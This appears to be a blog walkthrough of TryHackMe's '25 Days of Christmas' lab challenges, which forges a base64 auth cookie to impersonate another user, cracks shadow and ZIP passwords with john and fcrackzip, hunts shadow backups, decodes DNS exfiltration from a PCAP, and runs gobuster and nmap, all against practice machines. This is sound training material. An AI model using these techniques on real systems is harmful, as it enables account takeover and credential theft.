---
layout: post
title: TryHackMe - 25 Days of Christmas
---

## Inventory Management
Deploy the machine and access the website at `http://[your-ip-here]:3000`.


### What is the name of the cookie used for authentication?

Go to `http://[your-ip-here]:3000/register` to make an account, then login.

```
GET /home HTTP/1.1
Host: 10.10.120.159:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.120.159:3000/register
DNT: 1
Connection: close
Cookie: authid=YXY0ZXI5bGwxIXNz
Upgrade-Insecure-Requests: 1
```

Cookie is named authid.

### If you decode the cookie, what is the value of the fixed part of the cookie?

```
$ echo YXY0ZXI5bGwxIXNz | base64 -d
av4er9ll1!ss
```
My username is 'a', so the fixed part of the cookie might be 'v4er9ll1!ss'. I made another account to verify this was true.

### After accessing his account, what did the user mcinventory request?

```
$ echo -ne 'mcinventoryv4er9ll1!ss' | base64
bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw==
[convert to URL encoding]
bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw%3D%3D
```
Set authid cookie, and you're logged in. In the entries table, mcinventory requested a firewall.

## Arctic Forum

Access the page at `http://[your-ip-here]:3000`.

### What is the path of the hidden page?

Admin login is at `/sysadmin`.

```
$ gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir --url 'http://10.10.122.35:3000'
[...]
/home (Status: 302)
/login (Status: 200)
/admin (Status: 302)
/Home (Status: 302)
/assets (Status: 301)
/css (Status: 301)
/Login (Status: 200)
/js (Status: 301)
/logout (Status: 302)
/sysadmin (Status: 200)
/Admin (Status: 302)
```
### What is the password you found?

In the source of `/sysadmin`, there is a comment:
```html
   <!--
    Admin portal created by arctic digital design - check out our github repo
    -->
```

Per this [repo](https://github.com/ashu-savani/arctic-digital-design), we find default credentials: `admin:defaultpass`.

### What do you have to take to the 'partay'

There is a comment inside `/admin` that reads:
```
Hey all - Please don't forget to BYOE(Bring Your Own Eggnog) for the partay!!
```

## Evil Elf

Download the PCAP file and open it in Wireshark.

### Whats the destination IP on packet number 998?
Go->Go To Packet..., enter 998 and copy the field value: `63.32.89.195`

### What item is on the Christmas list?
Edit->Find Packet..., select packet details and search for string 'christmas'.
In packet 2255, the Telnet data field contains the following line: `echo 'ps4' > christmas_list.txt\n`

### Crack buddy's password!

Searching the packet details for the string `buddy` returns packet 2908 which contains a shadow file.

```
$ echo -ne 'buddy:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::' > unshadowed
$ john unshadowed
[...]
rainbow          (buddy)
```

## Training

Access the machine via SSH on port 22 using the command

ssh mcsysadmin@[your-machines-ip]

username: mcsysadmin
password: bestelf1234

### How many visible files are there in the home directory(excluding ./ and ../)?

```bash
[mcsysadmin@ip-10-10-238-178 ~]$ ls | wc -l
8
```

### What is the content of file5?

```bash
[mcsysadmin@ip-10-10-238-178 ~]$ cat file5
recipes
```

### Which file contains the string ‘password’?
```bash
[mcsysadmin@ip-10-10-238-178 ~]$ grep password *
file6:passwordHpKRQfdxzZocwg5O0RsiyLSVQon72CjFmsV4ZLGjxI8tXYo1NhLsEply
```

### What is the IP address in a file in the home folder?

The format of IP addresses can be described as four sets of one to three integers delimited by periods. The first set could be described with `([0-9]{1,3}[\.])`, i.e. one to three numbers `0-9` followed by a period. This search requires 3 sets of this, and then one set at the end without a trailing period. 

```
[mcsysadmin@ip-10-10-238-178 ~]$ grep -oE "([0-9]{1,3}[\.]){3}[0-9]{1,3}" *
file2:10.0.0.05
```

### How many users can log into the machine?

```
[mcsysadmin@ip-10-10-238-178 ~]$ ls /home
ec2-user  mcsysadmin
```
ec2-user, mcsysadmin, and root could all supposedly log in.

### What is the sha1 hash of file8?

```
[mcsysadmin@ip-10-10-238-178 ~]$ sha1sum file8
fa67ee594358d83becdd2cb6c466b25320fd2835  file8
```

### What is mcsysadmin’s password hash?

```bash
[mcsysadmin@ip-10-10-238-178 ~]$ find / -name "*shadow*" -type f 2>/dev/null
/etc/gshadow
/etc/shadow
/etc/shadow-
/etc/gshadow-
/var/shadow.bak
/usr/lib64/libuser/libuser_shadow.so
[...]
[mcsysadmin@ip-10-10-238-178 ~]$ grep mcsysadmin /var/shadow.bak
mcsysadmin:$6$jbosYsU/$qOYToX/hnKGjT0EscuUIiIqF8GHgokHdy/Rg/DaB.RgkrbeBXPdzpHdMLI6cQJLdFlS4gkBMzilDBYcQvu2ro/:18234:0:99999:7:::
```
The password hash is: 
> jbosYsU/$qOYToX/hnKGjT0EscuUIiIqF8GHgokHdy/Rg/DaB.RgkrbeBXPdzpHdMLI6cQJLdFlS4gkBMzilDBYcQvu2ro/

I spent some time trying to figure out if I could generate it myself, but it would've been impossible without the salt. If you're interested in how to generate a password that could be in a shadow file:
```bash
$ python -c "import crypt, getpass, pwd; print(crypt.crypt('bestelf1234', '\$6\$jbosYsU/\$'))"
$6$jbosYsU/$qOYToX/hnKGjT0EscuUIiIqF8GHgokHdy/Rg/DaB.RgkrbeBXPdzpHdMLI6cQJLdFlS4gkBMzilDBYcQvu2ro/
```

## Ho-Ho-Hosint

Download thegrinch.jpg.

### What is Lola's date of birth? Format: Month Date, Year(e.g November 12, 2019)

```
$ exiftool thegrinch.jpg
[selected interesting output]
File Modification Date/Time     : 2020:10:05 14:11:34-07:00
File Access Date/Time           : 2020:10:05 14:11:38-07:00
Creator                         : JLolax1
```
Searching the web for username JLolax1, I found a twitter page which had the following info:
```
Twitter name: Elf Lola
Handle: @JLolax1
Birthday: 12/29/1900
Job: Santa's Helper, later professional photographer
Website: https://lolajohnson1998.wordpress.com/
Phone: iPhone X
```
### What is Lola's current occupation?

Twitter bio says Santa's Helper.

### What phone does Lola make?

A tweet says iPhone X.

### What date did Lola first start her photography? Format: dd/mm/yyyy

The first day that the Wayback Machine has recorded of Lola's website is [Oct 23, 2019](https://web.archive.org/web/20191023204639/https://lolajohnson1998.wordpress.com/), which contains the line: I started as a freelance photographer five years ago today!

### What famous woman does Lola have on her web page?

[Reverse image search using Google Images](https://www.google.com/search?tbs=sbi:AMhZZis-82vxgsJsLhjxmhFwOOxbLzsYwGjws3-0Zfp-iBX3lpJelNFgCPbsYYo2lAOUy8zQFygsqAz7XwN0tupaVfqMlrBFlC2naxXR4X-LFSN_189civtG4YIyrYgDWSJ6vkek4nobADtOidiCj_19NMWt4lzLxSbvunAd7rucZ3jojrPTXbg3r3wmwwVuf9U3eLdnGhR3OIlA7kd8D8zvs807ozTH2ygVrWNhyp2m7tITKTVjONWSGy3dqY8o3LXnS5ZnAejq1H7MBLc0vRNnYSdIH1REaH0ardcV8rGvuZ3Hczbw2diOd6i6YU7SVjTlF-VsW7zgW793DUO0g8rz1WZCvMS1CDEg&btnG=Search%20by%20image&hl=en_US), to find out it's Ada Lovelace.

## Data Elf-iltration

Download the PCAP file, and open it in Wireshark.

### What data was exfiltrated via DNS?

If you filter by `dns`, you can see an extremely long subdomain of holidaythief.com being queried.
```
$ echo '43616e64792043616e652053657269616c204e756d6265722038343931.holidaythief.com' | cut -d '.' -f1 | xxd -r -p
Candy Cane Serial Number 8491
```

### What did Little Timmy want to be for Christmas?

Search packet details for the string 'christmas' to find an HTTP GET request for `/christmaslists.zip`.

> File->Export Objects->HTTP...

I extracted both christmaslists.zip and TryHackMe.jpg.

Inside the ZIP is Timmy's christmas list, but the ZIP is password protected.
```
$ fcrackzip -b --method 2 -D -p ~/rockyou.txt -vu
./christmaslists.zip
found file 'christmaslistdan.tx', (size cp/uc     91/    79, flags 9, chk 9a34)
found file 'christmaslistdark.txt', (size cp/uc     91/    82, flags 9, chk 9a4d)
found file 'christmaslistskidyandashu.txt', (size cp/uc    108/   116, flags 9, chk 9a74)
found file 'christmaslisttimmy.txt', (size cp/uc    105/   101, flags 9, chk 9a11)


PASSWORD FOUND!!!!: pw == december

$ unzip -P december christmaslists.zip
Archive:  christmaslists.zip
 extracting: christmaslistdan.tx
  inflating: christmaslistdark.txt
  inflating: christmaslistskidyandashu.txt
  inflating: christmaslisttimmy.txt

$ cat christmaslisttimmy.txt
Dear Santa,
For Christmas I would like to be a PenTester! Not the Bic kind!
Thank you,
Little Timmy.
```

### What was hidden within the file?

```
$ steghide extract -sf TryHackMe.jpg
Enter passphrase:
wrote extracted data to "christmasmonster.txt".
$ head -n 2 christmasmonster.txt
                              ARPAWOCKY
                               RFC527
```
A cover(?) poem of Jabberwocky.

## Skilling Up

Deploy instance--mine was 10.10.38.184.

### How many TCP ports under 1000 are open?
```bash
$ nmap -p1-1000 10.10.38.184
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 18:13 EDT
Nmap scan report for 10.10.38.184
Host is up (0.32s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
111/tcp open  rpcbind
999/tcp open  garcon

Nmap done: 1 IP address (1 host up) scanned in 2.12 seconds
```

### What is the name of the OS of the host?
```bash
$ nmap -A 10.10.38.184
[...]
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/5%OT=22%CT=1%CU=33139%PV=Y%DS=4%DC=T%G=Y%TM=5F7B9AE
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=104%GCD=2%ISR=10A%TI=Z%CI=Z%TS=A)SEQ(TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508
OS:ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=
OS:M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=
OS:Y%T=FF%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=FF%S=O%A=S+%F=AS%RD=0%Q
OS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%
OS:T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD
OS:=0%Q=)T7(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=FF%IPL
OS:=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=FF%CD=S)
```
A flavor of Linux is running.

### What version of SSH is running?
`nmap -p22 -sV 10.10.38.184` tells us OpenSSH v7.4.

### What is the name of the file that is accessible on the server you found running?

`nmap -p999 -sV 10.10.38.184` tells us there is an HTTP service running. At http://10.10.38.184:999 we can find `interesting.file`.


## SUID Shenanigans

### What port is SSH running on?

### Find and run a file as igor. Read the file /home/igor/flag1.txt

### Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?


